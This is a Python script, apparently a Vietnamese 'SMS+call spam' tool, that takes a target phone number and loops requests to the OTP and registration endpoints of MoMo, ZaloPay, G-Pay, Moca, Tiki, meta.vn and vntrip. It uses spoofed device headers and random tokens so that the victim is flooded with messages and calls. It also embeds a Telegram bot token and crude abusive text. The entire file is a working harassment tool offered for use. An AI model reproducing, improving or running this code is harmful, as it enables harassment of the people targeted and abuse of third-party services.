import os
import threading
import requests
from pystyle import *
import time
import sys
import uuid
import random
import socket
import requests
import telebot

bot = telebot.TeleBot("<6187913085:AAGjCqdb0V4pyRDZL_UYgvJF4qPRtkOUX1Y>")

class SPAM:
    def __init__(self):
        self.blue = Col.light_blue
        self.lblue = Colors.StaticMIX((Col.light_blue, Col.white, Col.white))
        self.red = Colors.StaticMIX((Col.red, Col.white, Col.white))
        self.appVer = 40012
        self.appCode = '4.0.1'
        self.time_zone = int(round(time.time() * 1000))
        self.imei = uuid.uuid4()
        self.token = f'{self.random_string(22)}:{self.random_string(53)}-{self.random_string(86)}'
        self.headers = {
            'Host': 'api.momo.vn',
            'msgtype': 'SEND_OTP_MSG',
            'Accept': 'application/json',
            'agent_id': 'undefined',
            'app_version': '31161',
            'Authorization': 'Bearer undefined',
            'user_phone': 'undefined',
            'app_code': '3.1.16',
            'Accept-Language': 'vi-vn',
            'device_os': 'IOS',
            'lang': 'vi',
            'User-Agent': 'MoMoPlatform-Release/31161 CFNetwork/1240.0.4 Darwin/20.5.0',
        }
        self.ua = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
}
    def format_print(self, symbol, text):
        return f"""                      {Col.Symbol(symbol, self.lblue, self.blue)} {self.lblue}{text}{Col.reset}"""
    def format_input(self, symbol, text):
        return f"""                      {Col.Symbol(symbol, self.red, self.blue)} {self.red}{text}{Col.reset}"""
    def banner(self):
        os.system("cls" if os.name == "nt" else "clear")
        title = '\n\n\n---TOOL SPAM SMS+CALL MOMO LE ANH TUAN---'
        banner = '''\n

            LE ANH TUAN SPAM TOOL
 
     ╚═══╦══════════════════════╦═══╝
    ╔════╩══════════════════════╩═════╗
    ║      SPAM SMS VERSION 1         ║
    ║      Zalo : 0775875447          ║
    ║      fb.com/leanhtuanvnnb       ║
    ║      Github : @leanhtuan19      ║
    ║                                 ║
    ║       Tool By Lê Anh Tuấn       ║
    ╚═════════════════════════════════╝
                                                                                                  
                               \n\n'''
        print(Colorate.Vertical(Colors.DynamicMIX((Col.light_green, Col.light_gray)), Center.XCenter(title)) + Colorate.Vertical(Colors.DynamicMIX((Col.light_red, Col.light_blue)), Center.XCenter(banner)))
    def random_string(self, length):
            number = '0123456789'
            alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ'
            id = ''
            for i in range(0,length,2):
                id += random.choice(number)
                id += random.choice(alpha)
            return id
    def checkdvc(self):
        while True:
            json_data = {
                'user': self.phone,
                'msgType': 'CHECK_USER_BE_MSG',
                'momoMsg': {
                    '_class': 'mservice.backend.entity.msg.RegDeviceMsg',
                    'number': self.phone,
                    'imei': str(self.imei),
                    'cname': 'Vietnam',
                    'ccode': '084',
                    'device': 'iPhone',
                    'firmware': '14.6',
                    'hardware': 'iPhone',
                    'manufacture': 'Apple',
                    'csp': 'Carrier',
                    'icc': '',
                    'mcc': '0',
                    'mnc': '0',
                    'device_os': 'ios',
                    'secure_id': '',
                },
                'appVer': self.appVer,
                'appCode': self.appCode,
                'lang': 'vi',
                'deviceOS': 'ios',
                'channel': 'APP',
                'buildNumber': 0,
                'appId': 'vn.momo.platform',
                'cmdId': f'{self.time_zone}000000',
                'time': self.time_zone,
            }

            response = requests.post('https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG', headers=self.headers, json=json_data)
            time.sleep(500)
    def send_otp(self):
        json_data = {
                'user': self.phone,
                'msgType': 'SEND_OTP_MSG',
                'momoMsg': {
                    '_class': 'mservice.backend.entity.msg.RegDeviceMsg',
                    'number': self.phone,
                    'imei': str(self.imei),
                    'cname': 'Vietnam',
                    'ccode': '084',
                    'device': 'iPhone',
                    'firmware': '14.6',
                    'hardware': 'iPhone',
                    'manufacture': 'Apple',
                    'csp': 'Carrier',
                    'icc': '',
                    'mcc': '0',
                    'mnc': '0',
                    'device_os': 'ios',
                    'secure_id': '',
                },
                'extra': {
                    'action': 'SEND',
                    'rkey': self.random_string(20),
                    'IDFA': '',
                    'SIMULATOR': False,
                    'TOKEN': self.token,
                    'ONESIGNAL_TOKEN': self.token,
                    'SECUREID': '',
                    'MODELID': str(self.imei),
                    'DEVICE_TOKEN': '',
                    'isVoice': False,
                    'REQUIRE_HASH_STRING_OTP': True,
                },
                'appVer': self.appVer,
                'appCode': self.appCode,
                'lang': 'vi',
                'deviceOS': 'ios',
                'channel': 'APP',
                'buildNumber': 0,
                'appId': 'vn.momo.platform',
                'cmdId': f'{self.time_zone}000000',
                'time': self.time_zone,
            }
        try:
            response = requests.post('https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG', headers=self.headers, json=json_data).json()['errorDesc']
            if 'Thành công' in response:
                print(self.format_print("Spam thành công !",f"MOMO: {response}"))
            else:
                print(self.format_print("Spam thành công !",f"MOMO: "+response))
        except:
            print(self.format_print("Spam thành công !",f"MOMO: BAD REQUESTS LIMIT!"))
    def send_code(self):
        json_data = {
                'user': self.phone,
                'msgType': 'REG_DEVICE_MSG',
                'momoMsg': {
                    '_class': 'mservice.backend.entity.msg.RegDeviceMsg',
                    'number': self.phone,
                    'imei': str(self.imei),
                    'cname': 'Vietnam',
                    'ccode': '084',
                    'device': 'iPhone',
                    'firmware': '14.6',
                    'hardware': 'iPhone',
                    'manufacture': 'Apple',
                    'csp': 'Carrier',
                    'icc': '',
                    'mcc': '0',
                    'mnc': '0',
                    'device_os': 'ios',
                    'secure_id': '',
                },
                'extra': {
                    'ohash': 'a55b1a625c9e36b3e2a001db13f18ad3afd6e0a19dcae6066566ba1f5f14e3d6',
                    'IDFA': '',
                    'SIMULATOR': False,
                    'TOKEN': self.token,
                    'ONESIGNAL_TOKEN': self.token,
                    'SECUREID': '',
                    'MODELID': str(self.imei),
                    'DEVICE_TOKEN': '',
                },
                'appVer': self.appVer,
                'appCode': self.appCode,
                'lang': 'vi',
                'deviceOS': 'ios',
                'channel': 'APP',
                'buildNumber': 0,
                'appId': 'vn.momo.platform',
                'cmdId': f'{self.time_zone}000000',
                'time': self.time_zone,
            }
        try:
            response = requests.post('https://api.momo.vn/backend/otp-app/public/REG_DEVICE_MSG', headers=self.headers, json=json_data).json()['errorDesc']
            print(self.format_print("Spam thành công !",f"MOMO: "+response))
        except:
            print(self.format_print("Spam không thành công :(",f"MOMO: BAD REQUESTS LIMIT!"))
    def Gbay(self):
        json_data = {
            'phone_number': self.phone,
            'hash': self.random_string(40),
        }
        try:
            response = requests.post('https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone', json=json_data).json()['meta']['msg']
            print(self.format_print("Spam thành công !",f"GBAY: SUCCESS!"))
        except:
            print(self.format_print("Spam không thành công :(",f"GBAY: ERROR!"))
    
    def moca(self):
        headers = {
            'Host': 'moca.vn',
            'Accept': '*/*',
            'Device-Token': str(self.imei),
            'X-Requested-With': 'XMLHttpRequest',
            'Accept-Language': 'vi',
            'X-Moca-Api-Version': '2',
            'platform': 'P_IOS-2.10.42',
            'User-Agent': 'Pass/2.10.42 (iPhone; iOS 13.3; Scale/2.00)',
        }
        params = {
                'phoneNumber': self.phone,
            }
        try:
            home = requests.get('https://moca.vn/moca/v2/users/role', params=params, headers=headers).json()
            token = home['data']['registrationId']
            response = requests.post(f'https://moca.vn/moca/v2/users/registrations/{token}/verification', headers=headers).json()
            print(self.format_print("Spam thành công !",f"MOCA: SUCCESS!"))
        except:
            print(self.format_print("Spam không thành công :(",f"MOCA: ERROR!"))
            
    def zalopay(self):
        try:
            headers = {
                'Host': 'api.zalopay.vn',
                'x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1',
                'x-device-model': 'iPhone8,2',
                'x-density': 'iphone3x',
                'authorization': 'Bearer ',
                'x-device-os': 'IOS',
                'x-drsite': 'off',
                'accept': '*/*',
                'x-app-version': '7.13.1',
                'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9',
                'user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2',
                'x-platform': 'NATIVE',
                'x-os-version': '14.6',
            }
            params = {
                'phone_number': self.phone,
            }

            token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
            json_data = {
                'phone_number': self.phone,
                'send_otp_token': token,
            }

            response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text
            print(self.format_print("Spam thành công !",f"ZALOPAY: SUCCESS!"))
        except:
            print(self.format_print("Spam không thành công :(",f"ZALOPAY: ERROR!"))
    def tiki(self):
        try:
            json_data = {
                    'phone_number': self.phone,
                }
            response_tiki = requests.post('https://tiki.vn/api/v2/customers/otp_codes', headers=self.ua, json=json_data).text
            print(self.format_print("Spam thành công !",f"TIKI: SUCCESS!"))
        except:
            print(self.format_print("Spam không thành công :(",f"TIKI: ERROR!"))
    def meta_vn(self):
        try:
            params = {
                'api_mode': '1',
            }

            json_data = {
                'api_args': {
                    'lgUser': self.phone,
                    'act': 'send',
                    'type': 'phone',
                },
                'api_method': 'CheckExist',
            }

            response_meta_vn = requests.post('https://meta.vn/app_scripts/pages/AccountReact.aspx', params=params, headers=self.ua, json=json_data).text
            print(self.format_print("Spam thành công !",f"METAVN: SUCCESS!"))
        except:
            print(self.format_print("Spam không thành công :(",f"METAVN: ERROR!"))
    def vntrip(self):
        try:
            json_data = {
                'feature': 'register',
                'phone': '+84'+self.phone[1:11],
            }

            response_vntrip = requests.post('https://micro-services.vntrip.vn/core-user-service/verification/request/phone', headers=self.ua, json=json_data).text
            print(self.format_print("Spam thành công !",f"VNTRIP: SUCCESS!"))
        except:
            print(self.format_print("Spam không thành công :(",f"VNTRIP: ERROR!"))
    def run_sendotp(self):
        while True:
            self.send_otp()
            time.sleep(60)
    def run_sendcode(self):
        while True:
            for x in range(3):
                self.send_code()
                time.sleep(1)
            time.sleep(70)
    def run(self):
        while True:
            self.banner()
            self.phone = input(self.format_input("!",f"|Lê Anh Tuấn| NHẬP SỐ ĐIỆN THOẠI CẦN SPAM  : "))
            if self.phone != '0775875447':
                if len(self.phone) == 10:
                    break
                print(self.format_print("!", "SỐ ĐIỆN THOẠI DƯỚI <10 SỐ XIN NHẬP LẠI !"))
            if self.phone == '0775875447':
                print(self.format_print("!", "SỐ ĐIỆN THOẠI ADMIN LE ANH TUAN SPAM CÁI CON CẶC NÈ"))
            time.sleep(3)
            
        
        threading.Thread(target=self.checkdvc).start()
        time.sleep(1)
        threading.Thread(target=self.run_sendotp).start()
        time.sleep(1)
        threading.Thread(target=self.run_sendcode).start()
        while True:
            self.Gbay()
            self.zalopay()
            self.moca()
            self.tiki()
            self.meta_vn()
            self.vntrip()
            time.sleep(30)
            
if __name__ == "__main__":
    try:
        SPAM().run()
    except KeyboardInterrupt:
        time.sleep(3)
        sys.exit('\n'+SPAM().format_print('*', 'Tạm biệt nhé:) Cảm ơn đã sử dụng'))